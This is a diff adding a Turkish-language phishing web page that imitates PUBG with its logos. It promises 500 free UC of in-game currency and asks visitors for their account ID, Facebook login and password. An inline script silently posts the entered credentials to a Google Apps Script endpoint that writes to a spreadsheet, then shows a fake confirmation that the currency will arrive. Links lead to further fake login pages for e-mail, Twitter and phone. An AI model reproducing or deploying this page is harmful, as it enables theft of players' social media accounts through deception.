@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MEDELİN</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="shortcut icon"
+      href="https://wstatic-prod.pubg.com/web/live/static/favicons/favicon-32x32.png"
+      type="image/x-icon"
+    />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  </head>
+  <body>
+    <img class="advert" src="https://blogger.googleusercontent.com/img/a/AVvXsEgyN7OdsecktdjKBiso1tzaqI6NNpAAzCVX6QhLTNTntH985maqdC8jm3fiu4DijqJKMxk3b-_SwAVICCKtXXi-ZZbdebmc-2wj4_whOr9KlrOr4aWDMcuQSNMSfZjrF7O6sgBa-e3QQLbdx4lDJUJlnxurK6Amg2JWW-Kv73IkLqhDuXTyeVxjLfga3A" alt="Background">
+
+    <div class="orta">
+      <nav>
+        <img
+          class="logo"
+          src="https://wstatic-prod.pubg.com/web/live/main_9b5ee57/img/2256138.png"
+          alt="logo"
+        />
+      </nav>
+
+      <form name="submit-to-google-sheet">
+        <span>Uc Gönderilecek Hesap İD:</span>
+        <input type="number" name="name" placeholder="İD" required>
+        <div class="drop-down">Facebook Adresi<i class="fa-solid fa-caret-down" style="color: aliceblue; margin-left: 4px;"></i>
+        <ul class="down">
+          <li><a href="E-posta Giriş.html">E-posta</a></li>
+          <li><a href="Twitter Giriş.html">Twitter Giriş</span></li>
+          <li><a href="Telefon Giriş.html">Tel. Giriş</a></li>
+        </ul>
+        </div>
+        <input type="text" name="facebook" placeholder="facebook" required>
+        <span>Şifre</span>
+        <input type="password" name="password" placeholder="Şifre" required>
+        <button type="submit" name="myButton">Gönder</button>
+        <span style="font-size: 11px; color: yellowgreen;">Her Hesaba Tek Seferlik 500uc Gönderilecektir</span>
+        <span style="color: yellowgreen; font-size: 12px;" id="msg"></span>
+        <a target="_blank" href="https://www.facebook.com/" style="font-size: 13px; color: aliceblue; margin: 4px 0; list-style: armenian;">Şifremi unutum</a>
+      </form>
+    </div>
+
+  
+    <script src="script.js"></script>
+    <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbzesxMraGoAaEOzzSg32rAzT3flfYTWatQ3oo22xHaB_X53ik6fC5fAFq2tbUJICeL1/exec'
+      const form = document.forms['submit-to-google-sheet']
+      const msg = document.getElementById('msg')
+    
+      form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => {
+            msg.innerHTML = "işlem Tamamlanmıştır Belirli Süre Sonunda Tüm Hesaplara Uc Gönderilecektir"
+            setTimeout(function() {
+              msg.innerHTML = ""
+            }, 5000)
+            form.reset()
+          })
+          .catch(error => console.error('Error!', error.message))
+      })
+    </script>
+  </body>
+</html>
